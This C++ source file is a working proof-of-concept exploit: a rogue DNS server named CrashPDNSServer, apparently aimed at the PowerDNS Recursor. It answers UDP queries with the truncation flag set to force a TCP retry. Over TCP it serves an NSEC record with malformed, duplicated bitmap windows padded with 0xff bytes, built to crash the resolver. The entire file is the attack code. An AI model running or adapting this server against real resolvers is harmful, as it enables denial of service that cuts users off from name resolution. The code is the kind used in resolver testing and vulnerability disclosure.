#include "dns_server.hpp"
#include <boost/program_options.hpp>
#include <iostream>

const int   TTL          = 10;
const char *BIND_ADDRESS = "0.0.0.0";

namespace dns
{
    class DupNSECBitmapField
    {
    public:
	class Window
	{
	public:
	    explicit Window( uint8_t i = 0 )
		: index( i )
	    {}

	    void        setIndex( uint8_t i ) { index = i; }
	    void        add( Type );
	    uint16_t    size() const;
	    void        outputWireFormat( WireFormat &message ) const;
	    std::string toString() const;
	    uint16_t    getIndex() const { return index; }
            uint8_t     getWindowSize() const;
            const std::vector<Type> &getTypes() const {  return types; }

	private:
	    uint16_t          index;
	    std::vector<Type> types;

	    static uint8_t typeToBitmapIndex( Type );
	};

	void        add( Type );
	void        addWindow( const Window &win );
        std::vector<Type> getTypes() const;

	std::string toString() const;
	uint16_t    size() const;
	void        outputWireFormat( WireFormat &message ) const;
    private:
	std::multimap<uint8_t, Window> windows;

	static uint8_t typeToWindowIndex( Type );
    };

    class DupRecordNSEC : public RDATA
    {
    private:
        Domainname         next_domainname;
        DupNSECBitmapField bitmaps;

    public:
	DupRecordNSEC( const Domainname &next, const DupNSECBitmapField &b )
	    : next_domainname( next ), bitmaps( b )
	{}
        const Domainname &getNextDomainname() const { return next_domainname; }
        std::vector<Type> getTypes() const { return bitmaps.getTypes(); }

        virtual std::string toZone() const;
        virtual std::string toString() const;

        virtual void outputWireFormat( WireFormat &message ) const;
        virtual void outputCanonicalWireFormat( WireFormat &message ) const;
        virtual uint16_t size() const;
        virtual uint16_t type() const
        {
            return TYPE_NSEC;
        }
	virtual DupRecordNSEC *clone() const
	{
	    return new DupRecordNSEC( next_domainname, bitmaps );
	}
    };


    void DupNSECBitmapField::Window::add( Type t )
    {
	types.push_back( t );
    }

    uint8_t DupNSECBitmapField::Window::getWindowSize() const
    {
	uint8_t max_bytes = 0;
	for ( Type t : types ) {
	    max_bytes = std::max<uint8_t>( max_bytes, typeToBitmapIndex( t ) / 8 + 1 );
	}
	return max_bytes + 8;
    }

    uint16_t DupNSECBitmapField::Window::size() const
    {
        return getWindowSize() + 2;
    }

    void DupNSECBitmapField::Window::outputWireFormat( WireFormat &message ) const
    {
        uint8_t window_size = getWindowSize();
	message.pushUInt8( index );
	message.pushUInt8( window_size );

	std::vector<uint8_t> bitmaps;
	bitmaps.resize( window_size );
	for ( uint8_t &v : bitmaps )
	    v = 0;
	for ( Type t : types ) {
	    uint8_t index = 7 - ( typeToBitmapIndex( t ) % 8 );
	    uint8_t flag  = 1 << index;
            bitmaps.at( typeToBitmapIndex( t ) / 8 ) |= flag;
	}
        bitmaps.at( window_size - 1 - 7 ) = 0xff;
        bitmaps.at( window_size - 1 - 6 ) = 0xff;
        bitmaps.at( window_size - 1 - 5 ) = 0xff;
        bitmaps.at( window_size - 1 - 4 ) = 0xff;
        bitmaps.at( window_size - 1 - 3 ) = 0xff;
        bitmaps.at( window_size - 1 - 2 ) = 0xff;
        bitmaps.at( window_size - 1 - 1 ) = 0xff;
        bitmaps.at( window_size - 1 - 0 ) = 0xff;
	message.pushBuffer( bitmaps );
    }

    std::string DupNSECBitmapField::Window::toString() const
    {
	std::ostringstream os;
	for ( Type t : types ) {
	    os << typeCodeToString( t ) << ",";
	}

	std::string result( os.str() );
	result.pop_back();
	return result;
    }

    uint8_t DupNSECBitmapField::Window::typeToBitmapIndex( Type t )
    {
	return (0xff & t);
    }


    void DupNSECBitmapField::add( Type t )
    {
	uint8_t window_index = typeToWindowIndex( t );
	auto window = windows.find( window_index );
	if ( window == windows.end() ) {
	    windows.insert( std::make_pair( window_index, Window( window_index ) ) );
	}
	window = windows.find( window_index );
	window->second.add( t );
    }

    void DupNSECBitmapField::addWindow( const DupNSECBitmapField::Window &win )
    {
	uint8_t window_index = win.getIndex();
	windows.insert( std::make_pair( window_index, win ) );
	/*
	auto window = windows.find( window_index );
	if ( window == windows.end() ) {
	    windows.insert( std::make_pair( window_index, win ) );
	}
	else {
	    std::ostringstream os;
	    os << "Bad DupNSEC record( mutiple window index \"" << (int)window_index << "\" is found.";
	    throw std::runtime_error( os.str() );
	}
	*/
    }

    std::vector<Type> DupNSECBitmapField::getTypes() const
    {
        std::vector<Type> types;
        for ( auto bitmap : windows ) {
            types.insert( types.end(), bitmap.second.getTypes().begin(), bitmap.second.getTypes().end() );
        }
        return types;
    }

    std::string DupNSECBitmapField::toString() const
    {
	std::ostringstream os;
	for ( auto win : windows )
	    os << win.second.toString() << " ";
	std::string result( os.str() );
	result.pop_back();
	return result;
    }

    uint16_t DupNSECBitmapField::size() const
    {
	uint16_t s = 0;
	for ( auto win : windows ) {
	    s += win.second.size();
        }
	return s;
    }

    void DupNSECBitmapField::outputWireFormat( WireFormat &message ) const
    {
	for ( auto win : windows )
	    win.second.outputWireFormat( message );
    }

    uint8_t DupNSECBitmapField::typeToWindowIndex( Type t )
    {
	return (0xff00 & t) >> 8;
    }

    std::string DupRecordNSEC::toZone() const
    {
	return toZone();
    }

    std::string DupRecordNSEC::toString() const
    {
	return next_domainname.toString() + " " + bitmaps.toString();
    }

    void DupRecordNSEC::outputWireFormat( WireFormat &message ) const
    {
	next_domainname.outputCanonicalWireFormat( message );
	bitmaps.outputWireFormat( message );
    }

    void DupRecordNSEC::outputCanonicalWireFormat( WireFormat &message ) const
    {
        outputWireFormat( message );
    }

    uint16_t DupRecordNSEC::size() const
    {
	return next_domainname.size() + bitmaps.size();
    }

}

class CrashPDNSServer : public dns::DNSServer
{
public:
    CrashPDNSServer( const std::string &addr, uint16_t port )
        : dns::DNSServer( addr, port )
    {
	for ( uint16_t index = 0 ; index <= 0xff ; index++ ) {
	    dns::DupNSECBitmapField::Window window( index );
	    for ( uint16_t type = 0 ; type <= 0xff ; type++ ) {
		window.add( ( index << 8 ) + type );
	    }
            mBitmap.addWindow( window );
	}
	for ( int i = 0 ; i < 0xff * 4 ; i++ ) {
	    dns::DupNSECBitmapField::Window window( 0xff );
	    for ( uint16_t type = 0 ; type <= 0xff ; type++ ) {
		window.add( ( 0xff ) + type );
	    }
	    mBitmap.addWindow( window );
	}
    }

    dns::PacketInfo generateResponse( const dns::PacketInfo &query, bool via_tcp )
    {
        dns::PacketInfo           response;
        dns::QuestionSectionEntry query_question = query.question_section[ 0 ];

        dns::QuestionSectionEntry question1;
        question1.q_domainname = query_question.q_domainname;
        question1.q_type       = query_question.q_type;
        question1.q_class      = query_question.q_class;
        response.question_section.push_back( question1 );

        if ( ! via_tcp ) {
            response.id                   = query.id;
            response.opcode               = 0;
            response.query_response       = 1;
            response.authoritative_answer = 1;
            response.truncation           = 1;
            response.recursion_desired    = 0;
            response.recursion_available  = 0;
            response.zero_field           = 0;
            response.authentic_data       = 1;
            response.checking_disabled    = 1;
            response.response_code        = dns::NO_ERROR;

            return response;
        }

        dns::ResourceRecord answer;
        dns::Domainname next_name = query_question.q_domainname;
        next_name.addSubdomain( "a" );

        answer.r_domainname = query_question.q_domainname;
        answer.r_type       = dns::TYPE_NSEC;
        answer.r_class      = dns::CLASS_IN;
        answer.r_ttl        = TTL;
        answer.r_resource_data =
            dns::RDATAPtr( new dns::DupRecordNSEC( next_name, mBitmap ) );
        response.answer_section.push_back( answer );

        response.id                   = query.id;
        response.opcode               = 0;
        response.query_response       = 1;
        response.authoritative_answer = 1;
        response.truncation           = 0;
        response.recursion_desired    = 0;
        response.recursion_available  = 0;
        response.zero_field           = 0;
        response.authentic_data       = 1;
        response.checking_disabled    = 1;
        response.response_code        = dns::NO_ERROR;

        return response;
    }

private:
    dns::DupNSECBitmapField mBitmap;
};

int main( int argc, char **argv )
{
    namespace po = boost::program_options;

    std::string bind_address;
    uint16_t    bind_port;

    po::options_description desc( "for pdns recursor" );
    desc.add_options()( "help,h", "print this message" )
        ( "bind,b", po::value<std::string>( &bind_address )->default_value( BIND_ADDRESS ), "bind address" )
        ( "port,p", po::value<uint16_t>( &bind_port )->default_value( 53 ), "bind port" )
        ;

    po::variables_map vm;
    po::store( po::parse_command_line( argc, argv, desc ), vm );
    po::notify( vm );

    if ( vm.count( "help" ) ) {
        std::cerr << desc << "\n";
        return 1;
    }

    CrashPDNSServer server( bind_address, bind_port );
    server.start();

    return 0;
}
